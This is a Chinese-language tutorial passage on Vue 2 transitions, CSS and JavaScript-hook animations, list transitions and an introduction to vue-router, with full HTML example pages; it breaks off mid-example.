### 4.1.过渡和动画基础

#### 4.1.1.什么是过渡和动画

​	Vue在插入、更新或移除DOM时，提供了多种过渡效果。这里所说的过渡，简而言之，就是从一个状态向另一个状态插入值，新的状态替换了旧的状态。

​	Vue提供了内置的过渡封装组件，即`transition`组件，语法格式如下：

```vue
<transition name="fade">
    <!-- 需要添加过渡的div标签 -->
    <div>
        
    </div>
</transition>
```

​	上述代码中，`<transition>`标签中用来放置需要添加过渡的div元素，使用name属性可以设置前缀，将name属性设为fade，那么"fade-"就是在过渡中切换的类名前缀，如fade-enter、fade-leave等。如果`<transition>`标签上没有设置name属性名，那么"v-"就是这些类名的默认前缀，如v-enter、v-leave等。推荐设置name值进行命名，这样在应用到另一个过渡时就不会产生冲突。

​	通过`<transition>`标签搭配CSS动画（如@keyframes）可以实现动画效果。动画相比过渡来说，可以在一个声明中设置多个状态，例如，可以在动画20%的位置设置一个关键帧，然后在动画50%的位置设置一个完全不同的状态。另外，`<transition>`标签还提供了一些钩子函数，可以结合JavaScript代码来完成动画效果。

#### 4.1.2.transition组件

​	Vue为`<transition>`标签内部的元素提供了3个进入过渡的类和3个离开过渡的类，如下表：

| 过渡状态  | 过渡类型       | 说明                                 | 生效时间                                                     |
| --------- | -------------- | ------------------------------------ | ------------------------------------------------------------ |
| 进入enter | v-enter        | 进入过渡的开始状态，作用于开始的一帧 | 在元素被插入之前生效，在元素被插入之后的下一帧移除           |
|           | v-enter-active | 进入过渡生效时的状态，作用于整个过程 | 在整个进入过渡的阶段中应用，在元素被插入之前生效，在过渡动画完成后移除 |
|           | v-enter-to     | 进入过渡的结束状态，作用于结束的一帧 | 在元素被插入之后的下一帧生效（与此同时v-enter被移除），在过渡动画完成之后移除 |
| 离开leave | v-leave        | 离开过渡的开始状态，作用于开始的一帧 | 在离开过渡被触发时立刻生效，下一帧被移除                     |
|           | v-leave-active | 离开过渡生效时的状态，作用于整个过程 | 在整个离开过渡阶段中应用，在离开过渡被触发时立刻生效，在过渡完成之后移除 |
|           | v-leave-to     | 离开过渡的结束状态，作用于结束的一帧 | 在离开过渡被触发之后的下一帧生效（与此同时v-leave被移除），在过渡动画完成之后移除 |

​	案例：通过单击按钮实现图形宽度的隐藏与现实。切换显示状态时，让宽度从0增长到200px；切换隐藏状态时，让宽度从200px减少到0的过渡效果。

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312211013317.gif)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <style>
        /* 图形初始状态 */
        .chart {
            width: 200px;
            height: 50px;
            background-color: orange;
        }
        /* 进入和离开的过程 */
        .box-enter-active, .box-leave-active {
            /* width的变化，动画时间时3s */
            transition: width 3s;  
        }
        /* 进入的初始状态和离开的结束状态 */
        .box-enter, .box-leave-to {
            width: 0;
        }
        
        /* 进入的结束状态和离开的初始状态 */
        .box-enter-to, .box-leave {
            width: 200px;
        }
    </style>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="toggle()">改变图形宽度</button>
            <transition name="box">
                <div class="chart" v-if="show"></div>
            </transition>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            show:true
                        },
                        methods: {
                            toggle() {
                                this.show = !this.show  // 每次都取反
                            }
                        },
                        
                })
        </script>
</body>
</html>
```



#### 4.1.3.自定义类名

​	Vue中的transition组件允许使用自定义类名。如果使用自定义类名，则不需要给`<transition>`标签设置name属性。自定义类名是通过属性来设置的，具体属性如下：

- enter-class
- enter-active-class
- enter-to-class
- leave-class
- leave-active-class
- leave-to-class



​	自定义类名的优先级高于普通类名，所以能够很好地与其他第三方CSS库结合使用。

1. **自定义类名结合animate.css实现动画**

`animate.css`是一个跨浏览器的CSS3动画库，它内置了很多经典的CSS3动画，使用起来很方便。点击进入`animate.css`的<a href="https://animate.style/">官方网站</a>，我们可以采用CDN的方式引入：

```html
<head>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
  />
</head>
```

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312211109280.gif)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
        />
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="show=!show">显示/隐藏</button>
            <!-- 
                下面两个自定义类名，animated是基本类名，任何
                想实现动画的元素都要添加它,bounceInLeft是入场动画
                bounceOutLeft是出场动画
             -->
            <transition enter-active-class="animated bounceInLeft"
            leave-active-class="animated bounceOutLeft">
                <p v-if="show">过渡文字效果</p>
            </transition>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            show:true
                        }
                        
                })
        </script>
</body>
</html>
```

2.**appear初始渲染动画**

之前的案例都是通过时间方法控制动画，如果希望给元素添加初始渲染的动画效果，可以通过给transition组件设置appear属性来实现。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="show=!show">显示/隐藏</button>
            <transition appear appear-active-class="animated swing"
            enter-active-class="animated bounceIn"
            leave-actice-class="animated bounceOut">
                <div v-if="show">过渡文字效果</div>
            </transition>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            show:true
                        }
                        
                })
        </script>
</body>
</html>
```



#### 4.1.4.使用@keyframes创建CSS动画

​	使用`@keyframes`创建CSS动画的额用法与之前的CSS过渡用法类似，区别在于动画中`v-enter`类名在节点插入DOM后不会立即删除，二十在`animationend`动画结束时间触发时产出。`@keyframes`在创建动画过程中，可以多次改变CSS样式，通过百分比或关键词from和to来实现动画状态，其语法格式如下：

```css
@keyframes animation-name {
    keyframes-selector {
        样式;
    }
}
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312211133137.gif" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <style>
        div.circular {
            width: 100px;
            height: 100px;
            background-color: red;
            border-radius: 50%;
            margin-top: 20px;
            text-align: center;
            line-height: 100px;
            color: aqua;
        }
        .bounce-enter-active {
            animation: Ami 0.5s;
        }
        .bounce-leave-active {
            animation: Ami 0.5s;
        }

        @keyframes Ami {
            0% {
                /* 缩放 */
                transform:scale(0);
                background-color: red;
            }
            25% {
                transform:scale(1);
                background-color: orange;
            }
            50% {
                transform:scale(1.5);
                background-color: blue;
            }
            25% {
                transform:scale(1);
                background-color: yellow;
            }
        }
    </style>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="show=!show">使用@keyframes创建动画</button>
            <transition name="bounce">
                <div class="circular" v-if="show">圆形</div>
            </transition>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            show:true
                        }
                        
                })
        </script>
</body>
</html>
```

#### 4.1.5.使用钩子函数实现动画

​	根据Vue的声明钩子也能随着生命周期的进行而创建动画。使用方式如下：

```vue
<transition
v-on:before-enter=“beforeEnter”
v-on:enter=“enter”
v-on:after-enter=“afterEnter”
v-on:enter-cancelled=“enterCancelled”

v-on:before-leave=“beforeLeave”
v-on:leave=“leave”
v-on:after-leave=“afterLeave”
v-on:leave-cancelled=“leaveCancelled”>
</transition>
```

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312211141629.gif)

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue使用模板</title>
    <!--  1.导入vue.js库  -->
    <script src="../js/vue.js"></script>
 
    <!--  编写小球的显示样式  -->
    <style>
        #boll{
            margin-top: 10px;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: lightpink;
        }
    </style>
</head>
<body>
 
    <div id="app">
 
        <!-- 使用v-on绑定click事件执行切换show变量,用于控制下面p标签的v-if -->
        <button @click="show = !show">
            加入购物车
        </button>
 
        <!-- 设置动画小球 -->
        <transition
                v-on:before-enter="beforeEnter"
                v-on:enter="enter"
                v-on:after-enter="afterEnter"
                v-on:enter-cancelled="enterCancelled"
        >
            <div v-if="show" id="boll"></div>
        </transition>
 
    </div>
 
    <script>
        // 2\. 创建一个Vue的实例
        var vm = new Vue({
            el: '#app',
            data: {
                show: true
            },
            methods:{
                // --------
                // 进入中
                // --------
 
                beforeEnter: function (el) {
                    // 开始准备进入动画状态
                    console.log("执行进入动画中的beforeEnter钩子函数");
                    // 设置小球开始动画之前的，起始位置
                    el.style.transform = "translate(0, 0)";
                },
                // 当与 CSS 结合使用时
                // 回调函数 done 是可选的
                enter: function (el, done) {
                    // 已经进入动画状态，用于设置动画效果
                    console.log("执行进入动画中的enter钩子函数");
                    // 这句话，没有实际的作用，但是，如果不写，出不来动画效果；
                    // 可以认为 el.offsetWidth 会强制动画刷新
                    el.offsetWidth;
                    // enter 表示动画 开始之后的样式，这里，可以设置小球完成动画之后的，结束状态
                    el.style.transform = "translate(150px, 450px)";
                    el.style.transition = 'all 1s ease';
                    // 执行完毕，使用done方法回调afterEnter
                    done()
                },
                afterEnter: function (el) {
                    // 进入动画状态之后，执行结束恢复的操作
                    console.log("执行进入动画中的afterEnter钩子函数");
                    // 执行动画完毕后，再次隐藏小球
                    this.show = !this.show
                },
                enterCancelled: function (el) {
                    // 当取消进入动画状态的时候执行
                    console.log("执行进入动画中的enterCancelled钩子函数");
                },
            }
        })
    </script>
 
</body>
</html>
```



#### 4.1.6.结合Velocity.js实现动画

​	`Velocitu.js`是一个简单易用、高性能且功能丰富的轻量级JS动画库，它拥有颜色动画、转换动画(transforms)、循环、欢动、SVG动画和滚动动画等功能，并且支持链式编程。点击进入<a href="https://www.velocityjs.org/">官方网站</a>。

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312211520710.gif)

````vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/velocity.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="show=!show">动画效果</button>
            <transition 
            @before-enter="beforeEnter"
            @enter="enter"
            @leave="leave"
            :css="false">
                <p v-if="show">文字动画效果</p>
            </transition>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;

                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                        show:false
                    },
                    methods: {
                        beforeEnter(el) {
                            el.style.opcity = 0 // 透明度为0
                            el.style.transformOrigin = 'left'  // 设置旋转元素的基点位置
                            el.style.color = 'red' // 颜色为红色
                        },
                        enter(el, done) {
                            Velocity(el, {
                                opcity:1,
                                fontSize: '1.4em',
                            },
                            {
                                duration: 300  // 为动画的执行时间
                            }
                            )
                            Velocity(el,{
                                fontSize: '1em'
                            },
                            {
                                complete: done
                            })
                        },
                        leave(el, done) {
                            Velocity(el, {
                                translateX: '15px',
                                rotateZ:'50deg'
                            },
                            {
                                duration: 300  // 为动画的执行时间
                            }
                            )
                            Velocity(el,{
                                rotateZ: '45deg',
                                translateY: '30px',
                                translateX: '30px',
                                opcity: 0
                            },
                            {
                                complete: done
                            })
                        }
                    }
                        
                })
        </script>
</body>
</html>
````

### 4.2.多个元素过渡

​	`transition`组件在同一时间内只能有一个元素显示，当有多个元素时，需要使用`v-if`和`v-else`或`v-else-if`来区别显示条件，并且元素需要绑定不同的key值，否则Vue会复用元素，无法产生动画效果。

#### 4.2.1.相同标签名元素的过渡

​	当有相同标签名的元素切换时，需要通过**key**特性设置唯一值来标记，从而让Vue区分它们。

​	案例：单击button按钮，切换“保存”和“编辑”，当变量`isEditing`为true时，显示“保存”按钮，为false时，显示“编辑”按钮。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="isEditing=!isEditing">切换保存和编辑按钮</button>
            <div>
                <transition name="fade">
                    <button v-if="isEditing" key="save">保存</button>
                    <button v-else key="edit">编辑</button>
                </transition>
            </div>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            isEditing:true
                        }
                        
                })
        </script>
</body>
</html>
```



#### 4.2.2.过渡模式

​	新旧两个元素参与过渡的时候，新元素的进入和旧元素的离开会同时触发，这是因为`<transition>`的默认行为进入和离开同时发生了。如果要求离开的元素完全消失后，进入的元素再显示出来，可以使用`transition`提供的过的模式`mode`。

​	过渡模式的原理是，设置有序的过渡而不是同时发生过渡，完成之后新元素过渡进入，`in-out`表示新元素先进行过渡，完成之后当前元素过渡离开。

​	官方参考：https://v2.cn.vuejs.org/v2/guide/transitions.html#%E8%BF%87%E6%B8%A1%E6%A8%A1%E5%BC%8F

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251540639.gif)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <style>
        .fade-enter, .fade-leave-to { opacity: 0; }
        .fade-enter-active, .fade-leave-active { transition: opacity .5s; }
    </style> 
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <transition name="fade" mode="out-in">
                <button :key="isOff" @click="isOff = !isOff">{{isOff ? 'Off' : 'On'}}</button>
            </transition>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            isOff: false 
                        }
                        
                })
        </script>
</body>
</html>
```



### 4.3.多个组件过渡

​	多个组件之间的过渡，只需要使用动态组件即可，动态组件需要通过Vue中的`<component>`元素绑定`is`属性来实现多组件的过渡。

​	以下案例中，使用`component`组件的`is`属性来实现组件切换，`is`属性用于根据组件名称的不同来切换显示不同的组件控件。当 切换“登录”和“注册”时，新元素会先进行过渡，完成之后当前元素过渡离开。

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251557983.gif)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <style>
        .fade-enter-active, .fade-leave-active {
          transition: opacity .5s ease;
        }
        .fade-enter, .fade-leave-to {
          opacity: 0;
        }
    </style>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <a href="javascript:;" @click="compontentName='example1'">登录</a>
            <a href="javascript:;" @click="compontentName='example2'">注册</a>
            <transition name="fade" mode="in-out">
                <component :is="compontentName"></component>
            </transition>
        </div>
        <!-- 定义登录组件 -->
        <template id="example1">
            <span>我是登录组件</span>
        </template>
        <!-- 定义注册组件 -->
        <template id="example2">
            <span>我是注册组件</span>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                Vue.component('example1', {template: '#example1'})
                Vue.component('example2', {template: '#example2'})
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            compontentName: ''
                        }
                        
                })
        </script>
</body>
</html>
```

### 4.4.列表过渡

#### 4.4.1.什么是列表过渡

​	列表过渡，需要使用`v-for`和`transition-group`组件来实现。

```vue
<transition-group name="list" tag="div">
  <span v-for="item in items" :key="item">
    {{ item }}
  </span>
</transition-group>
```

​	`transition-group`组件会以一个真实元素呈现，在页面中默认渲染成`<span>`标签，可以通过`tag`属性来修改，如`<transition-group tag="div">`渲染出来就是`div`标签。

​	**注意：**列表的每一项都需要进行过渡，列表在循环时要给每一个列表项添加唯一的key属性值，这样列表才会有过渡效果。在进行列表过渡时，过渡模式不可用，因为不再互相切换特有的元素。

#### 4.4.2.列表的进入和离开过渡

​	以下案例，通过name属性自定义CSS类名前缀，来实现进入和离开的过渡效果。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251607763.png" alt="image-20231225160725610" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <style>
        /* 数字圆圈样式 */
        .list-item {
          display: inline-block;
          margin-right: 10px;
          background-color: red;
          border-radius: 50%;
          width: 25px;
          height: 25px;
          text-align: center;
          line-height: 25px;
          color: #fff;
        }
        /* 插入或移除元素的过程 */
        .list-enter-active, .list-leave-active {
          transition: all 1s;
        }
        /* 开始插入或移除结束的位置变化 */
        .list-enter, .list-leave-to {
          opacity: 0;
          transform: translateY(30px);
        }
    </style>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="add">随机插入一个数字</button>
            <button @click="remove">随机移除一个数字</button>
            <transition-group name="list" tag="p">
                <span v-for="item in items" :key="item" class="list-item">
                    {{item}}
                </span>
            </transition-group>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            items: [1, 2, 3, 4, 5], // 定义数字数组
                            nextNum: 6	// 下一个数字从6开始
                        },
                        methods: {
                            randomIndex () {
                                return Math.floor(Math.random() * this.items.length)
                            },
                            add () {		   // 单击“随机插入一个数字”时触发
                                this.items.splice(this.randomIndex(), 0, this.nextNum++)
                            },
                            remove () {		 // 单击“随机移除一个数字”时触发
                                this.items.splice(this.randomIndex(), 1)
                            }
                        }   
                })
        </script>
</body>
</html>
```

#### 4.4.3.列表的排序过渡

​	上述案例中，当插入或移除元素的时候，虽然有过渡动画， 但是周围的元素会瞬移到新的位置，而不是平滑地过渡。为了实现列表平滑过渡，可以借助`v-move`特性。`v-move` 对于设置过渡的切换时机和过渡曲线非常有用。`v-move`特性会在元素改变定位的过程中应用，它同之前的类名一样，可以通过`name`属性来自定义前缀（例如`name=“list”`，则对应的类名就是`list-move`），当然也可以通过`move-class`属性手动设置自定义类名。

​	修改上述代码地CSS部分，借助`v-mode`和定位来实现元素平滑过渡到新位置地效果：

```css
<style>
    /* 数字圆圈部分样式 */
    .list-item {
      display: inline-block;
      margin-right: 10px;
      background-color: red;
      border-radius: 50%;
      width: 25px;
      height: 25px;
      text-align: center;
      line-height: 25px;
      color: #fff;
    }
    /* 插入元素过程 */
    .list-enter-active {
      transition: all 1s;
    }
    /* 移除元素过程 */
    .list-leave-active {
      transition: all 1s;
      position: absolute;
    }
    /* 开始插入/移除结束的位置变化 */
    .list-enter, .list-leave-to {
      opacity: 0;
      transform: translateY(30px);
    }
    /* 元素定位改变时动画 */
    .list-move {
      transition: transform 1s;
    }
</style>
```

​	Vue使用了FLIP(First、Last、Invert、Play)简单动画队列来实现**排序过渡**，所以即使没有插入或者移除元素，对于元素顺序的变化也支持过渡动画。FLIP动画能提高动画的流畅度，可以解决动画的卡顿、闪烁等不流畅的现象，它不仅可以实现单列过渡，也可以实现多维网格的过渡。

​	引入`ladash.js`文件，重构上述代码，对数字进行排序，效果如下：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251644133.gif" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <style>
        .list-item {
          display: inline-block;
          margin-right: 10px;
          background-color: red;
          border-radius: 50%;
          width: 25px;
          height: 25px;
          text-align: center;
          line-height: 25px;
          color: #fff;
        }
        /* 元素定位改变时动画 */
        .list-move {
          transition: transform 1s;
        }
    </style>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/lodash.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="shuffle">洗牌</button>
            <transition-group name="list" tag="p">
                <span v-for="item in items" :key="item" class="list-item">
                    {{ item }}
                </span>
            </transition-group>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data() {
                            return { items: [1, 2, 3, 4, 5] }
                        },
                        methods: {
                            shuffle () {
                                // shuffle()函数把数组中的元素按随机顺序重新排列
                                this.items = _.shuffle(this.items)
                            }
                        }
                        
                })
        </script>
</body>
</html>
```

#### 4.4.4.列表交错过渡

​	在Vue中可以实现列表的交错过渡效果，它是通过data属性与JavaScript通信来实现的。

​	案例：使用钩子函数结合`Velocity.js`库实现搜索功能，根据关键字来筛选出符合要求的列表数据，并添加过渡效果。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251652845.png" alt="image-20231225165226756" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/velocity.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <input placeholder="请输入要查找的内容" v-model="query">
            <transition-group name="item" tag="ul" @before-enter="beforeEnter"
             @enter="enter" @leave="leave" v-bind:css="false">
              <li v-for="(item, index) in ComputedList" :key="item.msg"
               :data-index="index">
                {{ item.msg }}
              </li>
            </transition-group>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data() {
                            return {
                                query: '', // v-model绑定的值
                                items: [
                                    { msg: '杜鑫' },
                                    { msg: '黄鑫' },
                                    { msg: '杜林均' },
                                    { msg: '周林' },
                                    { msg: '张益' },
                                    { msg: '张宇' },
                                    ]
                                }
                        },
                        computed: {                     // 计算属性
                            ComputedList () {
                                var vm = this.query		      // 获取到input输入框中的内容
                                var nameList = this.items	  // 数组
                                return nameList.filter(function (item) {
                                    return item.msg.toLowerCase().indexOf(vm.toLowerCase()) !== -1
                                })
                            }
                        },
                        methods: {
                            beforeEnter (el) {
                                el.style.opacity = 0
                                el.style.height = 0
                            },
                            enter (el, done) {
                                var delay = el.dataset.index * 150
                                setTimeout(function () {
                                    Velocity(el, { opacity: 1, height: '1.6em' }, { complete: done })
                                }, delay)
                            },
                                leave (el, done) {
                                var delay = el.dataset.index * 150
                                setTimeout(function () {
                                    Velocity(el, { opacity: 0, height: 0 }, { complete: done })
                                }, delay)
                            }
                        }
                                            
                })
        </script>
</body>
</html>
```

#### 4.4.5.可复用过渡

​	在Vue中，过渡代码可以通过组件实现复用。若要创建一个可复用的过渡组件，需要将`transition`或者`transition-group`作为组件模板结构，然后在其内部通过插槽的方式编写列表结构即可。

​	将`4.4.4`的案例改造为可复用过渡，效果一样，代码更精简：

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/velocity.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <input placeholder="请输入要查找的内容" v-model="query">
            <fade :query="query" :items="items">
            <li v-for="(item, index) in ComputedList"
            :key="item.msg" :data-index="index">
                {{ item.msg }}
            </li>
            </fade>
        </div>
        <template id="temp">
            <transition-group name="item" tag="ul" @before-enter="beforeEnter"
             @enter="enter" @leave="leave" :css="false">
              <slot></slot>
            </transition-group>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建组件
                Vue.component('fade', {		    // 定义组件名为fade
                    props: ['query', 'items'],	// 组件实例的属性
                    template: '#temp', 
                    methods: {
                        beforeEnter (el) {
                            el.style.opacity = 0
                            el.style.height = 0
                        },
                        enter (el, done) {
                            var delay = el.dataset.index * 150
                            setTimeout(function () {
                                Velocity(el, {opacity: 1, height: '1.6em'}, {complete: done})
                            }, delay)
                        },
                        leave (el, done) {
                            var delay = el.dataset.index * 150
                            setTimeout(function () {
                                Velocity(el, {opacity: 0, height: 0}, {complete: done})
                            }, delay)
                        }
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data() {
                            return {
                                query: '', // v-model绑定的值
                                items: [
                                    { msg: '杜鑫' },
                                    { msg: '黄鑫' },
                                    { msg: '杜林均' },
                                    { msg: '周林' },
                                    { msg: '张益' },
                                    { msg: '张宇' },
                                    ]
                                }
                        },
                        computed: {	 // 计算属性
                            ComputedList () {
                            var vm = this.query
                            var nameList = this.items
                            return nameList.filter(function (item) {
                                return item.msg.toLowerCase().indexOf(vm.toLowerCase()) !== -1
                            })
                            }
                        }
                        
                })
        </script>
</body>
</html>
```



## 5.Vue路由

​	Vue中的路由允许使用不同的URL来访问不同的类容。

### 5.1.什么是路由

- **后端路由**：后端路由通过请求的URL分支到具体的处理程序，浏览器每次跳转到不同的URL，都会重新访问服务器。服务器接收到请求后，将数据和模板组合，返回HTML页面，或直接返回HTML模板，由前端JS程序再去请求数据，使用前端模板和数据进行组合，生成最终的HTML页面。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251732283.png" alt="image-20231225173227165" style="zoom:50%;" />

- **前端路由：**前端路由就是把不同路由对应不同的内容或页面的任务交给前端来做。对于单页面应用（SPA）来说，主要通过URL中的hash（#号）来实现不同页面之间的切换。hash有一个特点，就是HTTP请求中不会包含hash相关的内容，所以单页面程序中的页面跳转主要用hash来实现。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312251738042.png" alt="image-20231225173822890" style="zoom:50%;" />

​	对于上图中“#/home”就是hash方式的路由，由前端路由来处理，将hash值与页面中的组件对应，当hash值为“#/home”时，就显示“首页”组件。

### 5.2.vue-router

​	`vue-router`是Vue官方推出的路由管理器，主要用于管理URL，实现URL和组件的对应，以及通过URL进行组件间的切换，从而使构建单页面应用变得更加简单。

#### 5.2.1.vue-router的工作原理

​	单页面应用（SPA）的核心思想之一就是更新视图而不重新请求页面，简单来说，它在加载页面时，不会加载整个页面。只会更新某个指定的容器中的内容。

​	在实现单页面前端路由时，提供了两种方式：`hash`模式和`history`模式，根据mode参数来决定采用哪一种模式。

- **hash模式**：默认模式。使用URL的hash来模拟一个完整的URL，当URL改变时，页面不会重新加载。`#`就是hash符号，中文名为哈希符或锚点，在hash符号后的值称为hash值。路由的hash模式是利用了window可以监听`onhashchange`事件来实现的，也就是说hash是用来知道浏览器动作的，对服务器没有影响，HTTP请求中也不会包括hash值，同时每次改变hash值，都会在浏览器的访问历史中增加一条记录，使用“后退”按钮，就可以回到上一个位置。所以hash模式是根据hash值来发生改变的，根据不同的值，渲染指定DOM位置的不同数据。
- **history模式**：hash模式的URL会自带`#`，影响URL的美观，而history模式不会出现`#`，这种模式充分利用了`history.pushState()`来完成URL的跳转，而且无须重新加载页面。使用history模式时，需要配置`mode:'history'`，示例如下：

```vue
// main.js文件
const router = new VueRouter({
	mode:'history',
	routes:[...]
})
```



#### 5.2.2.vue-router的基本使用

​	`vue-router`可以实现当用户单击页面中的A按钮时，页面显示内容A；单击B按钮时，页面显示内容B。换言之，用户单击的按钮和页面显示的内容，两者是映射的关系。

- <font color="blue">route</font> ：表示它是一条路由，单数形式；
- <font color="blue">routes</font>：表示它是一组路由，把route的每一条路由组合起来，形成一个数组；
- <font color="blue">router</font>：表示它是一个机制，充当管理路由的管理者角色



​	引入Vue的：

```javascript
<script src="../js/vue-router.js"></script>
```

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
